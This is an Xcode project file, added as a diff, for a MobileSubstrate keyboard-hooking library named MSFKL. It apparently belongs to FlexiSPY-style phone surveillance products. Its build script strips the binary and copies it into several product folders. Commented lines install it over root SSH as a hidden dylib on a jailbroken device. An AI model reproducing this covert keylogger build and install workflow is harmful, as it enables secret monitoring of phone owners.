@@ -1,0 +1,514 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 45;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		35051C8C18E5955500849289 /* libsubstrate_arm64.dylib in Frameworks */ = {isa = PBXBuildFile; fileRef = 35051C8B18E5955500849289 /* libsubstrate_arm64.dylib */; };
+		3570555118E9232500B68C38 /* UIKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 3570555018E9232500B68C38 /* UIKit.framework */; };
+		851F89700F78271600A6C185 /* MSFKL.mm in Sources */ = {isa = PBXBuildFile; fileRef = 851F896F0F78271600A6C185 /* MSFKL.mm */; };
+		851F89900F7827DC00A6C185 /* Foundation.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 851F898F0F7827DC00A6C185 /* Foundation.framework */; };
+		C2655E9F17D711D300F0DF40 /* KeyboardUtils.m in Sources */ = {isa = PBXBuildFile; fileRef = C2655E9E17D711D300F0DF40 /* KeyboardUtils.m */; };
+		C2655F5917D71E8A00F0DF40 /* libFxStd.a in Frameworks */ = {isa = PBXBuildFile; fileRef = C2655E2917D70C9F00F0DF40 /* libFxStd.a */; };
+		C2655F5A17D71E8A00F0DF40 /* libIPC.a in Frameworks */ = {isa = PBXBuildFile; fileRef = C2655E2317D70C9100F0DF40 /* libIPC.a */; };
+		C2655F5C17D71E8A00F0DF40 /* libFxEvents.a in Frameworks */ = {isa = PBXBuildFile; fileRef = C2655E1417D70C6300F0DF40 /* libFxEvents.a */; };
+		C2D1C79217DD882A0063A506 /* CoreGraphics.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C2D1C77217DD87940063A506 /* CoreGraphics.framework */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXContainerItemProxy section */
+		35051C7118E593D300849289 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = C2655E0F17D70C6300F0DF40 /* FxEvents.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = 08629AF417F957080085D580;
+			remoteInfo = FxEventsMac;
+		};
+		35051C7418E593D300849289 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = C2655E2417D70C9F00F0DF40 /* FxStd.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = 0885379A17F98FC900AB08F2;
+			remoteInfo = FxStdMac;
+		};
+		35051C7718E593D300849289 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = C2655E1E17D70C9100F0DF40 /* IPC.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = 086B114117FA732900D21FD5;
+			remoteInfo = IPCMac;
+		};
+		C2655E1317D70C6300F0DF40 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = C2655E0F17D70C6300F0DF40 /* FxEvents.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = D2AAC07E0554694100DB518D;
+			remoteInfo = FxEvents;
+		};
+		C2655E2217D70C9100F0DF40 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = C2655E1E17D70C9100F0DF40 /* IPC.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = D2AAC07E0554694100DB518D;
+			remoteInfo = IPC;
+		};
+		C2655E2817D70C9F00F0DF40 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = C2655E2417D70C9F00F0DF40 /* FxStd.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = D2AAC07E0554694100DB518D;
+			remoteInfo = FxStd;
+		};
+		C2655E2E17D70CA600F0DF40 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = C2655E0F17D70C6300F0DF40 /* FxEvents.xcodeproj */;
+			proxyType = 1;
+			remoteGlobalIDString = D2AAC07D0554694100DB518D;
+			remoteInfo = FxEvents;
+		};
+		C2655E3C17D70CA600F0DF40 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = C2655E1E17D70C9100F0DF40 /* IPC.xcodeproj */;
+			proxyType = 1;
+			remoteGlobalIDString = D2AAC07D0554694100DB518D;
+			remoteInfo = IPC;
+		};
+		C2655F5517D71E4E00F0DF40 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = C2655E2417D70C9F00F0DF40 /* FxStd.xcodeproj */;
+			proxyType = 1;
+			remoteGlobalIDString = D2AAC07D0554694100DB518D;
+			remoteInfo = FxStd;
+		};
+/* End PBXContainerItemProxy section */
+
+/* Begin PBXFileReference section */
+		32CA4F630368D1EE00C91783 /* MSFKL_Prefix.pch */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = MSFKL_Prefix.pch; sourceTree = "<group>"; };
+		35051C8B18E5955500849289 /* libsubstrate_arm64.dylib */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.dylib"; name = libsubstrate_arm64.dylib; path = ../../OTC/MobileSubstrate/libsubstrate_arm64.dylib; sourceTree = "<group>"; };
+		3570555018E9232500B68C38 /* UIKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = UIKit.framework; path = System/Library/Frameworks/UIKit.framework; sourceTree = SDKROOT; };
+		85198FE10F780FA700C450C3 /* MSFKL.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = MSFKL.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		851F896F0F78271600A6C185 /* MSFKL.mm */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.cpp.objcpp; path = MSFKL.mm; sourceTree = "<group>"; };
+		851F89770F78276800A6C185 /* MSFKL-Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = "MSFKL-Info.plist"; sourceTree = SOURCE_ROOT; };
+		851F898F0F7827DC00A6C185 /* Foundation.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Foundation.framework; path = System/Library/Frameworks/Foundation.framework; sourceTree = SDKROOT; };
+		C2655E0F17D70C6300F0DF40 /* FxEvents.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = FxEvents.xcodeproj; path = ../../Events/FxEvents/FxEvents.xcodeproj; sourceTree = SOURCE_ROOT; };
+		C2655E1E17D70C9100F0DF40 /* IPC.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = IPC.xcodeproj; path = "../../IPC/Source-IPC/IPC.xcodeproj"; sourceTree = SOURCE_ROOT; };
+		C2655E2417D70C9F00F0DF40 /* FxStd.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = FxStd.xcodeproj; path = ../../Std/FxStd/FxStd.xcodeproj; sourceTree = SOURCE_ROOT; };
+		C2655E5117D70ED800F0DF40 /* Keyboard.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = Keyboard.h; sourceTree = "<group>"; };
+		C2655E9D17D711D300F0DF40 /* KeyboardUtils.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KeyboardUtils.h; sourceTree = "<group>"; };
+		C2655E9E17D711D300F0DF40 /* KeyboardUtils.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KeyboardUtils.m; sourceTree = "<group>"; };
+		C2D1C77217DD87940063A506 /* CoreGraphics.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = CoreGraphics.framework; path = System/Library/Frameworks/CoreGraphics.framework; sourceTree = SDKROOT; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		1D60588F0D05DD3D006BFB54 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				C2655F5917D71E8A00F0DF40 /* libFxStd.a in Frameworks */,
+				C2655F5A17D71E8A00F0DF40 /* libIPC.a in Frameworks */,
+				C2655F5C17D71E8A00F0DF40 /* libFxEvents.a in Frameworks */,
+				35051C8C18E5955500849289 /* libsubstrate_arm64.dylib in Frameworks */,
+				3570555118E9232500B68C38 /* UIKit.framework in Frameworks */,
+				851F89900F7827DC00A6C185 /* Foundation.framework in Frameworks */,
+				C2D1C79217DD882A0063A506 /* CoreGraphics.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		080E96DDFE201D6D7F000001 /* Classes */ = {
+			isa = PBXGroup;
+			children = (
+				C2655E4F17D70EAC00F0DF40 /* MS */,
+			);
+			path = Classes;
+			sourceTree = "<group>";
+		};
+		19C28FACFE9D520D11CA2CBB /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				85198FE10F780FA700C450C3 /* MSFKL.app */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		29B97314FDCFA39411CA2CEA /* CustomTemplate */ = {
+			isa = PBXGroup;
+			children = (
+				C2655E2417D70C9F00F0DF40 /* FxStd.xcodeproj */,
+				C2655E1E17D70C9100F0DF40 /* IPC.xcodeproj */,
+				C2655E0F17D70C6300F0DF40 /* FxEvents.xcodeproj */,
+				080E96DDFE201D6D7F000001 /* Classes */,
+				C2655E5017D70EBE00F0DF40 /* Hook Functions */,
+				C2655E9B17D7118E00F0DF40 /* KeyboardUtils */,
+				29B97315FDCFA39411CA2CEA /* Other Sources */,
+				29B97317FDCFA39411CA2CEA /* Resources */,
+				29B97323FDCFA39411CA2CEA /* Frameworks */,
+				19C28FACFE9D520D11CA2CBB /* Products */,
+			);
+			name = CustomTemplate;
+			sourceTree = "<group>";
+		};
+		29B97315FDCFA39411CA2CEA /* Other Sources */ = {
+			isa = PBXGroup;
+			children = (
+				32CA4F630368D1EE00C91783 /* MSFKL_Prefix.pch */,
+			);
+			name = "Other Sources";
+			sourceTree = "<group>";
+		};
+		29B97317FDCFA39411CA2CEA /* Resources */ = {
+			isa = PBXGroup;
+			children = (
+				851F89770F78276800A6C185 /* MSFKL-Info.plist */,
+			);
+			name = Resources;
+			sourceTree = "<group>";
+		};
+		29B97323FDCFA39411CA2CEA /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				35051C8B18E5955500849289 /* libsubstrate_arm64.dylib */,
+				3570555018E9232500B68C38 /* UIKit.framework */,
+				C2D1C77217DD87940063A506 /* CoreGraphics.framework */,
+				851F898F0F7827DC00A6C185 /* Foundation.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
+		C2655E1017D70C6300F0DF40 /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				C2655E1417D70C6300F0DF40 /* libFxEvents.a */,
+				35051C7218E593D300849289 /* libFxEventsMac.a */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		C2655E1F17D70C9100F0DF40 /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				C2655E2317D70C9100F0DF40 /* libIPC.a */,
+				35051C7818E593D300849289 /* libIPCMac.a */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		C2655E2517D70C9F00F0DF40 /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				C2655E2917D70C9F00F0DF40 /* libFxStd.a */,
+				35051C7518E593D300849289 /* libFxStdMac.a */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		C2655E4F17D70EAC00F0DF40 /* MS */ = {
+			isa = PBXGroup;
+			children = (
+				851F896F0F78271600A6C185 /* MSFKL.mm */,
+			);
+			name = MS;
+			sourceTree = "<group>";
+		};
+		C2655E5017D70EBE00F0DF40 /* Hook Functions */ = {
+			isa = PBXGroup;
+			children = (
+				C2655E5117D70ED800F0DF40 /* Keyboard.h */,
+			);
+			name = "Hook Functions";
+			sourceTree = "<group>";
+		};
+		C2655E9B17D7118E00F0DF40 /* KeyboardUtils */ = {
+			isa = PBXGroup;
+			children = (
+				C2655E9D17D711D300F0DF40 /* KeyboardUtils.h */,
+				C2655E9E17D711D300F0DF40 /* KeyboardUtils.m */,
+			);
+			name = KeyboardUtils;
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXNativeTarget section */
+		1D6058900D05DD3D006BFB54 /* MSFKL */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 1D6058960D05DD3E006BFB54 /* Build configuration list for PBXNativeTarget "MSFKL" */;
+			buildPhases = (
+				1D60588D0D05DD3D006BFB54 /* Resources */,
+				1D60588E0D05DD3D006BFB54 /* Sources */,
+				1D60588F0D05DD3D006BFB54 /* Frameworks */,
+				C2655E4117D70E3C00F0DF40 /* ShellScript */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				C2655E2F17D70CA600F0DF40 /* PBXTargetDependency */,
+				C2655E3D17D70CA600F0DF40 /* PBXTargetDependency */,
+				C2655F5617D71E4E00F0DF40 /* PBXTargetDependency */,
+			);
+			name = MSFKL;
+			productName = MSFKL;
+			productReference = 85198FE10F780FA700C450C3 /* MSFKL.app */;
+			productType = "com.apple.product-type.application";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		29B97313FDCFA39411CA2CEA /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+			};
+			buildConfigurationList = C01FCF4E08A954540054247B /* Build configuration list for PBXProject "MSFKL" */;
+			compatibilityVersion = "Xcode 3.1";
+			developmentRegion = English;
+			hasScannedForEncodings = 1;
+			knownRegions = (
+				en,
+			);
+			mainGroup = 29B97314FDCFA39411CA2CEA /* CustomTemplate */;
+			projectDirPath = "";
+			projectReferences = (
+				{
+					ProductGroup = C2655E1017D70C6300F0DF40 /* Products */;
+					ProjectRef = C2655E0F17D70C6300F0DF40 /* FxEvents.xcodeproj */;
+				},
+				{
+					ProductGroup = C2655E2517D70C9F00F0DF40 /* Products */;
+					ProjectRef = C2655E2417D70C9F00F0DF40 /* FxStd.xcodeproj */;
+				},
+				{
+					ProductGroup = C2655E1F17D70C9100F0DF40 /* Products */;
+					ProjectRef = C2655E1E17D70C9100F0DF40 /* IPC.xcodeproj */;
+				},
+			);
+			projectRoot = "";
+			targets = (
+				1D6058900D05DD3D006BFB54 /* MSFKL */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXReferenceProxy section */
+		35051C7218E593D300849289 /* libFxEventsMac.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libFxEventsMac.a;
+			remoteRef = 35051C7118E593D300849289 /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		35051C7518E593D300849289 /* libFxStdMac.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libFxStdMac.a;
+			remoteRef = 35051C7418E593D300849289 /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		35051C7818E593D300849289 /* libIPCMac.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libIPCMac.a;
+			remoteRef = 35051C7718E593D300849289 /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		C2655E1417D70C6300F0DF40 /* libFxEvents.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libFxEvents.a;
+			remoteRef = C2655E1317D70C6300F0DF40 /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		C2655E2317D70C9100F0DF40 /* libIPC.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libIPC.a;
+			remoteRef = C2655E2217D70C9100F0DF40 /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		C2655E2917D70C9F00F0DF40 /* libFxStd.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libFxStd.a;
+			remoteRef = C2655E2817D70C9F00F0DF40 /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+/* End PBXReferenceProxy section */
+
+/* Begin PBXResourcesBuildPhase section */
+		1D60588D0D05DD3D006BFB54 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		C2655E4117D70E3C00F0DF40 /* ShellScript */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# FlexiSPY\ncp \"${TARGET_BUILD_DIR}/${PRODUCT_NAME}.app/${EXECUTABLE_NAME}\" \"../../../FlexiSPY/MSFKL-Dylib/${EXECUTABLE_NAME}.dylib\"\nstrip -u -r ../../../FlexiSPY/MSFKL-Dylib/${EXECUTABLE_NAME}.dylib\n#ldid -S ../../../FlexiSPY/MSFKL-Dylib/${EXECUTABLE_NAME}.dylib\n\n\n# FeelSecure\ncp \"${TARGET_BUILD_DIR}/${PRODUCT_NAME}.app/${EXECUTABLE_NAME}\" \"../../../FeelSecure/MSFKL-Dylib/${EXECUTABLE_NAME}.dylib\"\nstrip -u -r ../../../FeelSecure/MSFKL-Dylib/${EXECUTABLE_NAME}.dylib\n#ldid -S ../../../FeelSecure/MSFKL-Dylib/${EXECUTABLE_NAME}.dylib\n\n\n# Cyclops\ncp \"${TARGET_BUILD_DIR}/${PRODUCT_NAME}.app/${EXECUTABLE_NAME}\" \"../../../Cyclops/MSFKL-Dylib/${EXECUTABLE_NAME}.dylib\"\nstrip -u -r ../../../Cyclops/MSFKL-Dylib/${EXECUTABLE_NAME}.dylib\n#ldid -S ../../../Cyclops/MSFKL-Dylib/${EXECUTABLE_NAME}.dylib\n\n\n# Panic+\ncp \"${TARGET_BUILD_DIR}/${PRODUCT_NAME}.app/${EXECUTABLE_NAME}\" \"../../../Panic+/MSFKL-Dylib/${EXECUTABLE_NAME}.dylib\"\nstrip -u -r ../../../Panic+/MSFKL-Dylib/${EXECUTABLE_NAME}.dylib\n#ldid -S ../../../Panic+/MSFKL-Dylib/${EXECUTABLE_NAME}.dylib\n\n\n# Apricot\ncp \"${TARGET_BUILD_DIR}/${PRODUCT_NAME}.app/${EXECUTABLE_NAME}\" \"../../../Apricot/MSFKL-Dylib/${EXECUTABLE_NAME}.dylib\"\nstrip -u -r ../../../Apricot/MSFKL-Dylib/${EXECUTABLE_NAME}.dylib\n#ldid -S ../../../Apricot/MSFKL-Dylib/${EXECUTABLE_NAME}.dylib\n\n\n# ApricotV2\ncp \"${TARGET_BUILD_DIR}/${PRODUCT_NAME}.app/${EXECUTABLE_NAME}\" \"../../../ApricotV2/MSFKL-Dylib/${EXECUTABLE_NAME}.dylib\"\nstrip -u -r ../../../ApricotV2/MSFKL-Dylib/${EXECUTABLE_NAME}.dylib\n#ldid -S ../../../ApricotV2/MSFKL-Dylib/${EXECUTABLE_NAME}.dylib\n\n####################################################################################################################################################################\n#DEVICE_IP=192.168.3.102\n#ssh root@${DEVICE_IP} rm -rf /Library/MobileSubstrate/DynamicLibraries/.${EXECUTABLE_NAME}.dylib\n#scp ../../../FlexiSPY/MSFKL-Dylib/${EXECUTABLE_NAME}.dylib root@${DEVICE_IP}:/Library/MobileSubstrate/DynamicLibraries/.${EXECUTABLE_NAME}.dylib\n#ssh root@${DEVICE_IP} respring\n";
+		};
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		1D60588E0D05DD3D006BFB54 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				851F89700F78271600A6C185 /* MSFKL.mm in Sources */,
+				C2655E9F17D711D300F0DF40 /* KeyboardUtils.m in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin PBXTargetDependency section */
+		C2655E2F17D70CA600F0DF40 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			name = FxEvents;
+			targetProxy = C2655E2E17D70CA600F0DF40 /* PBXContainerItemProxy */;
+		};
+		C2655E3D17D70CA600F0DF40 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			name = IPC;
+			targetProxy = C2655E3C17D70CA600F0DF40 /* PBXContainerItemProxy */;
+		};
+		C2655F5617D71E4E00F0DF40 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			name = FxStd;
+			targetProxy = C2655F5517D71E4E00F0DF40 /* PBXContainerItemProxy */;
+		};
+/* End PBXTargetDependency section */
+
+/* Begin XCBuildConfiguration section */
+		1D6058940D05DD3E006BFB54 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = YES;
+				ARCHS = "$(ARCHS_STANDARD_INCLUDING_64_BIT)";
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "";
+				COPY_PHASE_STRIP = NO;
+				FRAMEWORK_SEARCH_PATHS = (
+					"$(inherited)",
+					"\"$(SRCROOT)/../../OTC/Frameworks/iOS4\"",
+				);
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PRECOMPILE_PREFIX_HEADER = YES;
+				GCC_PREFIX_HEADER = MSFKL_Prefix.pch;
+				INFOPLIST_FILE = "MSFKL-Info.plist";
+				IPHONEOS_DEPLOYMENT_TARGET = 6.0;
+				LIBRARY_SEARCH_PATHS = (
+					"$(inherited)",
+					"\\\\\\\"$(SRCROOT)/../../OTC/Frameworks/iOS4/SpringBoardServices.framework\\\\\\\"",
+					"\\\\\\\"$(DEVELOPER_DIR)_iOS4/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS4.3.sdk/System/Library/Frameworks/UIKit.framework\\\\\\\"",
+					/Backup/FFP_trunk/codebase/OTC/MobileSubstrate,
+					/Volumes/Data/Project/RELEASE/SmartShepherd2_2_2/codebase/OTC/MobileSubstrate,
+				);
+				ONLY_ACTIVE_ARCH = YES;
+				PRODUCT_NAME = MSFKL;
+				SDKROOT = iphoneos;
+				USER_HEADER_SEARCH_PATHS = "../../OTC/Frameworks/iOS5/UIKit ../../Std/FxStd/** ../../Std/FxStd ../../IPC/Source-IPC ../../Events/FxEvents ../../OTC/MobileSubstrate";
+			};
+			name = Debug;
+		};
+		1D6058950D05DD3E006BFB54 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = YES;
+				ARCHS = "$(ARCHS_STANDARD_INCLUDING_64_BIT)";
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "";
+				COPY_PHASE_STRIP = YES;
+				FRAMEWORK_SEARCH_PATHS = (
+					"$(inherited)",
+					"\"$(SRCROOT)/../../OTC/Frameworks/iOS4\"",
+				);
+				GCC_PRECOMPILE_PREFIX_HEADER = YES;
+				GCC_PREFIX_HEADER = MSFKL_Prefix.pch;
+				INFOPLIST_FILE = "MSFKL-Info.plist";
+				IPHONEOS_DEPLOYMENT_TARGET = 6.0;
+				LIBRARY_SEARCH_PATHS = (
+					"$(inherited)",
+					"\\\\\\\"$(SRCROOT)/../../OTC/Frameworks/iOS4/SpringBoardServices.framework\\\\\\\"",
+					"\\\\\\\"$(DEVELOPER_DIR)_iOS4/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS4.3.sdk/System/Library/Frameworks/UIKit.framework\\\\\\\"",
+					/Backup/FFP_trunk/codebase/OTC/MobileSubstrate,
+					/Volumes/Data/Project/RELEASE/SmartShepherd2_2_2/codebase/OTC/MobileSubstrate,
+				);
+				PRODUCT_NAME = MSFKL;
+				SDKROOT = iphoneos;
+				USER_HEADER_SEARCH_PATHS = "../../OTC/Frameworks/iOS5/UIKit ../../Std/FxStd/** ../../Std/FxStd ../../IPC/Source-IPC ../../Events/FxEvents ../../OTC/MobileSubstrate";
+			};
+			name = Release;
+		};
+		C01FCF4F08A954540054247B /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ARCHS = "$(ARCHS_STANDARD_32_BIT)";
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
+				GCC_C_LANGUAGE_STANDARD = c99;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				LD_OPENMP_FLAGS = "-fopenmp";
+				ONLY_ACTIVE_ARCH = YES;
+				OTHER_LDFLAGS = (
+					"-init",
+					"_$(PROJECT_NAME)Initialize",
+					"-lsubstrate",
+					"-dynamiclib",
+				);
+				PREBINDING = NO;
+				SDKROOT = iphoneos3.0;
+			};
+			name = Debug;
+		};
+		C01FCF5008A954540054247B /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ARCHS = "$(ARCHS_STANDARD_32_BIT)";
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
+				GCC_C_LANGUAGE_STANDARD = c99;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				PREBINDING = NO;
+				SDKROOT = iphoneos3.0;
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		1D6058960D05DD3E006BFB54 /* Build configuration list for PBXNativeTarget "MSFKL" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				1D6058940D05DD3E006BFB54 /* Debug */,
+				1D6058950D05DD3E006BFB54 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		C01FCF4E08A954540054247B /* Build configuration list for PBXProject "MSFKL" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				C01FCF4F08A954540054247B /* Debug */,
+				C01FCF5008A954540054247B /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+	};
+	rootObject = 29B97313FDCFA39411CA2CEA /* Project object */;
+}
